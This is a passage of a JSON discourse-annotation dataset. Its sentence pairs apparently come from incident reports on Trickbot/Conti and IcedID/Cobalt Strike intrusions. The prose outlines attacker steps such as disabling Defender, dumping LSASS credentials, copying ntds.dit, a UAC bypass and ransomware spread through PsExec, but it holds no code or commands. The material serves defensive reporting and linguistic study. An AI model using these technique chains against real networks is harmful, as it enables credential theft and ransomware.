        "S2": "To guarantee execution on the beachhead host, multiple payloads were used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To guarantee execution on the beachhead host, multiple payloads were used.",
        "S2": "One of the Cobalt Strike Beacons was the same payload and command and control infrastructure as used in a prior case.",
        "relation": "MISC"
    },
    {
        "S1": "One of the Cobalt Strike Beacons was the same payload and command and control infrastructure as used in a prior case.",
        "S2": "The initial access method for that case was IcedID, which shows that the threat actors utilize various initial access methods to get into environments and accomplish their goals.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial access method for that case was IcedID, which shows that the threat actors utilize various initial access methods to get into environments and accomplish their goals.",
        "S2": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "relation": "NEXT"
    },
    {
        "S1": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "S2": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.",
        "S2": "We observed the threat actors having technical issues.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the threat actors having technical issues.",
        "S2": "One example being with a Beacon unsuccessfully injecting into a process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One example being with a Beacon unsuccessfully injecting into a process.",
        "S2": "It is unclear if this was an untrained actor, or there was a configuration issue.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is unclear if this was an untrained actor, or there was a configuration issue.",
        "S2": "Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network.",
        "relation": "MISC"
    },
    {
        "S1": "Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network.",
        "S2": "Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server.",
        "relation": "NEXT"
    },
    {
        "S1": "Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server.",
        "S2": "Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked.",
        "S2": "Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to \u201cSYSTEM\u201d using named pipe impersonation.",
        "relation": "NEXT"
    },
    {
        "S1": "Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to \u201cSYSTEM\u201d using named pipe impersonation.",
        "S2": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
        "S2": "Once they had domain controller access, ntdsutil was used to take a snapshot of \u201cntds.dit\u201d, saved under \u201cC:\\Perflogs\\1\u201d, for offline password hash extraction.",
        "relation": "NEXT"
    },
    {
        "S1": "Once they had domain controller access, ntdsutil was used to take a snapshot of \u201cntds.dit\u201d, saved under \u201cC:\\Perflogs\\1\u201d, for offline password hash extraction.",
        "S2": "This is a technique that we don\u2019t see very often, but effective nevertheless.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is a technique that we don\u2019t see very often, but effective nevertheless.",
        "S2": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "S2": "This was the last observed hands-on-keyboard activity for awhile.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was the last observed hands-on-keyboard activity for awhile.",
        "S2": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "S2": "Psexec, with two separate batch files, were used to execute Conti ransomware on all domain-joined Windows hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "Psexec, with two separate batch files, were used to execute Conti ransomware on all domain-joined Windows hosts.",
        "S2": "This final deployment was executed around 6:45 UTC on a Monday morning.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This final deployment was executed around 6:45 UTC on a Monday morning.",
        "S2": "From the point the threat actors returned, to ransom deployment, it was less than 30 minutes.",
        "relation": "MISC"
    },
    {
        "S1": "From the point the threat actors returned, to ransom deployment, it was less than 30 minutes.",
        "S2": "This would give defenders little time to act if they had not identified and contained the activity from the first day of the Trickbot infection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This would give defenders little time to act if they had not identified and contained the activity from the first day of the Trickbot infection.",
        "S2": "The initial access was achieved as a result of the user opening what appeared to be a benign workbook, a lure, requiring little user interaction.",
        "relation": "MISC"
    },
    {
        "S1": "The initial access was achieved as a result of the user opening what appeared to be a benign workbook, a lure, requiring little user interaction.",
        "S2": "The workbook contained hidden and password protected worksheets, these were malicious.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The workbook contained hidden and password protected worksheets, these were malicious.",
        "S2": "Module functions also indicated code designed to obfuscate and hide true values and functions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Module functions also indicated code designed to obfuscate and hide true values and functions.",
        "S2": "This document and the following DLL were noted as being associated to a BazarCall campaign by @ffforward.",
        "relation": "MISC"
    },
    {
        "S1": "This document and the following DLL were noted as being associated to a BazarCall campaign by @ffforward.",
        "S2": "From the xlsb document, the following execution chain occurs.",
        "relation": "MISC"
    },
    {
        "S1": "From the xlsb document, the following execution chain occurs.",
        "S2": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
        "S2": "We observed a second stage execution using regsvr32 to load a DLL from the user\u2019s AppData\\Local\\Temp folder.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed a second stage execution using regsvr32 to load a DLL from the user\u2019s AppData\\Local\\Temp folder.",
        "S2": "Almost immediately an outbound IPv4 address lookup was requested via HTTP.",
        "relation": "NEXT"
    },
    {
        "S1": "Almost immediately an outbound IPv4 address lookup was requested via HTTP.",
        "S2": "This is usually undertaken to identify the compromised environment, and to facilitate C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is usually undertaken to identify the compromised environment, and to facilitate C2.",
        "S2": "The user agent refers to Curl \u2013 and used again for another stage of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The user agent refers to Curl \u2013 and used again for another stage of the intrusion.",
        "S2": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "S2": "The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.",
        "S2": "A PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:",
        "relation": "MISC"
    },
    {
        "S1": "A PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:",
        "S2": "Named pipe impersonation was used to escalate to SYSTEM privileges \u2013 a common Cobalt Strike capability:",
        "relation": "LIST"
    },
    {
        "S1": "Named pipe impersonation was used to escalate to SYSTEM privileges \u2013 a common Cobalt Strike capability:",
        "S2": "We observed several attempts by the threat actor trying to escalate to SYSTEM \u2013 ultimately succeeding, as evident in several new services running under the Local SYSTEM context:",
        "relation": "MISC"
    },
    {
        "S1": "We observed several attempts by the threat actor trying to escalate to SYSTEM \u2013 ultimately succeeding, as evident in several new services running under the Local SYSTEM context:",
        "S2": "Service creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Service creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity.",
        "S2": "RedCanary provided useful background on GetSystem capabilities of offensive security tools and methods of detection.",
        "relation": "MISC"
    },
    {
        "S1": "RedCanary provided useful background on GetSystem capabilities of offensive security tools and methods of detection.",
        "S2": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
        "S2": "It first injected into wermgr.exe and then later into svchost.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It first injected into wermgr.exe and then later into svchost.exe.",
        "S2": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
        "relation": "LIST"
    },
    {
        "S1": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
        "S2": "WMIC was used to remotely execute \u2018def.bat\u2019.",
        "relation": "MISC"
    },
    {
        "S1": "WMIC was used to remotely execute \u2018def.bat\u2019.",
        "S2": "The contents of \u2018def.bat\u2019:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of \u2018def.bat\u2019:",
        "S2": "Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot\u2019s \u201cpwgrab\u201d module.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot\u2019s \u201cpwgrab\u201d module.",
        "S2": "LSASS was dumped remotely using ProcDump.",
        "relation": "MISC"
    },
    {
        "S1": "LSASS was dumped remotely using ProcDump.",
        "S2": "The execution took place from the beachhead using WMIC.",
        "relation": "MISC"
    },
    {
        "S1": "The execution took place from the beachhead using WMIC.",
        "S2": "\u201cNtdsutil\u201d was used to take a snapshot of ntds.dit and save it under \u201cC:\\Perflogs\\1\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "\u201cNtdsutil\u201d was used to take a snapshot of ntds.dit and save it under \u201cC:\\Perflogs\\1\u201d.",
        "S2": "This technique is useful for offline password hash extraction.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique is useful for offline password hash extraction.",
        "S2": "This activity occurred twice.",
        "relation": "MISC"
    },
    {
        "S1": "This activity occurred twice.",
        "S2": "The same batch file, \u201812.bat\u2019, was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same batch file, \u201812.bat\u2019, was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user.",
        "S2": "The contents of \u201812.bat\u2019:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of \u201812.bat\u2019:",
        "S2": "Net and Nltest commands were used to gather network and domain reconnaissance.",
        "relation": "MISC"
    },
    {
        "S1": "Net and Nltest commands were used to gather network and domain reconnaissance.",
        "S2": "During the intrusion, this activity was seen multiple times, on multiple hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the intrusion, this activity was seen multiple times, on multiple hosts.",
        "S2": "Other discovery commands included:",
        "relation": "MISC"
    },
    {
        "S1": "Other discovery commands included:",
        "S2": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "S2": "adf.bat was used to execute:",
        "relation": "NEXT"
    },
    {
        "S1": "adf.bat was used to execute:",
        "S2": "AdFind results were written to the following locations:",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind results were written to the following locations:",
        "S2": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "S2": "The results were saved in:",
        "relation": "NEXT"
    },
    {
        "S1": "The results were saved in:",
        "S2": "BloodHound was later executed on the domain controller as well.",
        "relation": "NEXT"
    },
    {
        "S1": "BloodHound was later executed on the domain controller as well.",
        "S2": "Once again the results were stored in:",
        "relation": "NEXT"
    },
    {
        "S1": "Once again the results were stored in:",
        "S2": "PowerSploit was loaded into memory on the DC and the following functions were used:",
        "relation": "NEXT"
    },
    {
        "S1": "PowerSploit was loaded into memory on the DC and the following functions were used:",
        "S2": "An encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:",
        "relation": "MISC"
    },
    {
        "S1": "An encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:",
        "S2": "The decoded PowerShell command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decoded PowerShell command:",
        "S2": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.",
        "relation": "MISC"
    },
    {
        "S1": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.",
        "S2": "Multiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with \u201cSYSTEM\u201d privileges.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with \u201cSYSTEM\u201d privileges.",
        "S2": "Decoded Cobalt Strike shellcode, using Cyber Chef recipe: https://github.com/mattnotmax/cyberchef-recipes#recipe-28\u2014de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decoded Cobalt Strike shellcode, using Cyber Chef recipe: https://github.com/mattnotmax/cyberchef-recipes#recipe-28\u2014de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode",
        "S2": "Multiple C2 channels were established, some were persistent whilst others appeared to be single purpose \u2013 used for payload retrieval or fallback C2.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple C2 channels were established, some were persistent whilst others appeared to be single purpose \u2013 used for payload retrieval or fallback C2.",
        "S2": "Persistent C2 activity was Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Persistent C2 activity was Cobalt Strike.",
        "S2": "The beachhead had multiple C2 channels, two of which were unique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The beachhead had multiple C2 channels, two of which were unique.",
        "S2": "We assess that the threat actors were ensuring a loss of a single source C2 wouldn\u2019t result in losing all C2 to the compromised environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess that the threat actors were ensuring a loss of a single source C2 wouldn\u2019t result in losing all C2 to the compromised environment.",
        "S2": "We observed a payload being retrieved from a unique IPv4 address.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a payload being retrieved from a unique IPv4 address.",
        "S2": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.",
        "S2": "Using the Curl 7.74.0 user agent:",
        "relation": "MISC"
    },
    {
        "S1": "Using the Curl 7.74.0 user agent:",
        "S2": "Analysis of this binary, shows C2 activity to the following:",
        "relation": "MISC"
    },
    {
        "S1": "Analysis of this binary, shows C2 activity to the following:",
        "S2": "The binary has an unusual PDB string that indicates obfuscation:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The binary has an unusual PDB string that indicates obfuscation:",
        "S2": "The two persistent C2 channels were analyzed to determine the Cobalt Strike configuration.",
        "relation": "MISC"
    },
    {
        "S1": "The two persistent C2 channels were analyzed to determine the Cobalt Strike configuration.",
        "S2": "Each C2 channel was configured as follows:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each C2 channel was configured as follows:",
        "S2": "As part of the discovery stage, we observed data being exfiltrated.",
        "relation": "MISC"
    },
    {
        "S1": "As part of the discovery stage, we observed data being exfiltrated.",
        "S2": "The data ranged from host discovery, running processes, and user accounts:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The data ranged from host discovery, running processes, and user accounts:",
        "S2": "Entire AD forest data \u2013 including usernames , DC configuration, and machine enumeration:",
        "relation": "MISC"
    },
    {
        "S1": "Entire AD forest data \u2013 including usernames , DC configuration, and machine enumeration:",
        "S2": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:",
        "relation": "MISC"
    },
    {
        "S1": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:",
        "S2": "Two batch scripts were executed on the domain controller to automate ransomware deployment via PSExec.",
        "relation": "NEXT"
    },
    {
        "S1": "Two batch scripts were executed on the domain controller to automate ransomware deployment via PSExec.",
        "S2": "The first was \u201c_COPY.bat\u201d, to stage the CONTI ransomware payload on all domain-joined computers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first was \u201c_COPY.bat\u201d, to stage the CONTI ransomware payload on all domain-joined computers.",
        "S2": "The second was \u201c_EXE.bat\u201d, to execute the staged CONTI payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second was \u201c_EXE.bat\u201d, to execute the staged CONTI payloads.",
        "S2": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.",
        "S2": "Files were then encrypted with the following extension [KCRAO]:",
        "relation": "NEXT"
    },
    {
        "S1": "Files were then encrypted with the following extension [KCRAO]:",
        "S2": "A readme.txt file was created in each folder:",
        "relation": "NEXT"
    },
    {
        "S1": "A readme.txt file was created in each folder:",
        "S2": "The content of readme.txt:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This intrusion once again highlights common tools in-use today for Initial Access and Post-Exploitation.",
        "S2": "Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file.",
        "S2": "This HTA file is used to download IcedID in the form of a JPG file.",
        "relation": "NEXT"
    },
    {
        "S1": "This HTA file is used to download IcedID in the form of a JPG file.",
        "S2": "This file is actually a Windows DLL file, which is executed via regsvr32 (1st stage IcedID).",
        "relation": "NEXT"
    },
    {
        "S1": "This file is actually a Windows DLL file, which is executed via regsvr32 (1st stage IcedID).",
        "S2": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll \u2013 IcedID \u2013 used for persistence) and regsvr32 (ekix4.dll \u2013 Cobalt Strike beacon \u2013 privilege escalation via fodhelper) to pillage the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll \u2013 IcedID \u2013 used for persistence) and regsvr32 (ekix4.dll \u2013 Cobalt Strike beacon \u2013 privilege escalation via fodhelper) to pillage the domain.",
        "S2": "Service Execution (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Service Execution (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.",
        "S2": "WMIC was utilized to launch ProcDump in an attempt to dump lsass.exe.",
        "relation": "MISC"
    },
    {
        "S1": "WMIC was utilized to launch ProcDump in an attempt to dump lsass.exe.",
        "S2": "WMIC was also used to perform discovery of endpoint security software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "WMIC was also used to perform discovery of endpoint security software.",
        "S2": "A flurry of other programs were used to perform discovery within the environment including nltest.exe, adfind.exe via adf.bat, and net.exe.",
        "relation": "MISC"
    },
    {
        "S1": "A flurry of other programs were used to perform discovery within the environment including nltest.exe, adfind.exe via adf.bat, and net.exe.",
        "S2": "Command and Control was achieved via IcedID and Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Command and Control was achieved via IcedID and Cobalt Strike.",
        "S2": "There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success.",
        "relation": "MISC"
    },
    {
        "S1": "There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success.",
        "S2": "Ultimately, the threat actors were unsuccessful when AV snagged their attempts to move to certain servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ultimately, the threat actors were unsuccessful when AV snagged their attempts to move to certain servers.",
        "S2": "Particular to this case, we saw an eleven day gap in activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Particular to this case, we saw an eleven day gap in activity.",
        "S2": "While command and control never left, activity\u2013other than beaconing, ceased.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While command and control never left, activity\u2013other than beaconing, ceased.",
        "S2": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
        "relation": "MISC"
    },
    {
        "S1": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
        "S2": "This may indicate a hand off to a new group, or the original actor may have returned, either way, we did not see a final action on objectives.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This may indicate a hand off to a new group, or the original actor may have returned, either way, we did not see a final action on objectives.",
        "S2": "Initial access for this intrusion was via a malicious attachment \u201corder 06.21.doc\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this intrusion was via a malicious attachment \u201corder 06.21.doc\u201d.",
        "S2": "The attachment was a Microsoft Word document that drops a malicious HTA file \u201ctextboxNameNamespace.hta\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attachment was a Microsoft Word document that drops a malicious HTA file \u201ctextboxNameNamespace.hta\u201d.",
        "S2": "Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded from http://povertyboring2020b[.]com.",
        "relation": "NEXT"
    },
    {
        "S1": "Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded from http://povertyboring2020b[.]com.",
        "S2": "This file\u2019s extension is misleading as the file is a Windows DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file\u2019s extension is misleading as the file is a Windows DLL.",
        "S2": "The HTA file is written to:",
        "relation": "MISC"
    },
    {
        "S1": "The HTA file is written to:",
        "S2": "The HTA file when executed downloads a file named \u201ctextboxNameNamespace.jpg\u201d, which is actually an IcedID DLL file responsible for the first stage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The HTA file when executed downloads a file named \u201ctextboxNameNamespace.jpg\u201d, which is actually an IcedID DLL file responsible for the first stage.",
        "S2": "Through the same HTA file, the IcedID first stage DLL file is executed via regsvr32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Through the same HTA file, the IcedID first stage DLL file is executed via regsvr32.exe.",
        "S2": "IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.",
        "S2": "After the initial compromise, the threat actors went silent for eleven days.",
        "relation": "NEXT"
    },
    {
        "S1": "After the initial compromise, the threat actors went silent for eleven days.",
        "S2": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "relation": "NEXT"
    },
    {
        "S1": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "S2": "IcedID establishes persistence on the compromised host using a scheduled task named \u2018{0AC9D96E-050C-56DB-87FA-955301D93AB5}\u2019 that executes its second stage.",
        "relation": "MISC"
    },
    {
        "S1": "IcedID establishes persistence on the compromised host using a scheduled task named \u2018{0AC9D96E-050C-56DB-87FA-955301D93AB5}\u2019 that executes its second stage.",
        "S2": "This scheduled task was observed to be executing hourly under the initially compromised user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This scheduled task was observed to be executing hourly under the initially compromised user.",
        "S2": "Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.",
        "relation": "MISC"
    },
    {
        "S1": "Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.",
        "S2": "Additional Cobalt Strike payloads were executed with the same fodhelper UAC bypass technique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additional Cobalt Strike payloads were executed with the same fodhelper UAC bypass technique.",
        "S2": "Cobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user.",
        "S2": "This activity was observed on workstations, a file server, and a backup server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity was observed on workstations, a file server, and a backup server.",
        "S2": "GetSystem was also used by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "GetSystem was also used by the threat actors.",
        "S2": "The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.",
        "S2": "ATTACK [PTsecurity] Overpass the hash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "ATTACK [PTsecurity] Overpass the hash.",
        "S2": "Encryption downgrade activity to ARCFOUR-HMAC-MD5\",10002228",
        "relation": "MISC"
    },
    {
        "S1": "Encryption downgrade activity to ARCFOUR-HMAC-MD5\",10002228",
        "S2": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "relation": "MISC"
    },
    {
        "S1": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "S2": "This activity appears to have failed due to Windows Defender activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity appears to have failed due to Windows Defender activity.",
        "S2": "IcedID initially performed some discovery of the local system and the domain.",
        "relation": "MISC"
    },
    {
        "S1": "IcedID initially performed some discovery of the local system and the domain.",
        "S2": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "relation": "NEXT"
    },
    {
        "S1": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "S2": "A discovery batch script that runs ADFind.exe was dropped to the system.",
        "relation": "MISC"
    },
    {
        "S1": "A discovery batch script that runs ADFind.exe was dropped to the system.",
        "S2": "ADFind.exe was executed by the discovery batch script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "ADFind.exe was executed by the discovery batch script.",
        "S2": "PowerView was used to discover local administrator access in the network.",
        "relation": "MISC"
    },
    {
        "S1": "PowerView was used to discover local administrator access in the network.",
        "S2": "The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.",
        "S2": "Cobalt Strike was injected into the winlogon.exe process and used to perform further discovery.",
        "relation": "NEXT"
    },
    {
        "S1": "Cobalt Strike was injected into the winlogon.exe process and used to perform further discovery.",
        "S2": "The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.",
        "S2": "Lateral Movement chain #1 \u2013 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral Movement chain #1 \u2013 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.",
        "S2": "The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.",
        "S2": "Lateral Movement chain #2 \u2013 Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral Movement chain #2 \u2013 Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.",
        "S2": "Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.",
        "S2": "Lateral Movement chain #3 \u2013 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike \u2018GetSystem\u2019 command which makes use of named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral Movement chain #3 \u2013 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike \u2018GetSystem\u2019 command which makes use of named pipes.",
        "S2": "A Cobalt Strike DLL was copied to a server and executed using WMI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A Cobalt Strike DLL was copied to a server and executed using WMI.",
        "S2": "This activity was observed on three servers, including the Domain Controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity was observed on three servers, including the Domain Controller.",
        "S2": "The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.",
        "relation": "MISC"
    },
    {
        "S1": "The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.",
        "S2": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.",
        "S2": "Cobalt Strike Configs:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this short intrusion, the threat actor gained initial access on a system through a maldoc campaign which made use of the Hancitor downloader.",
        "S2": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
        "relation": "NEXT"
    },
    {
        "S1": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
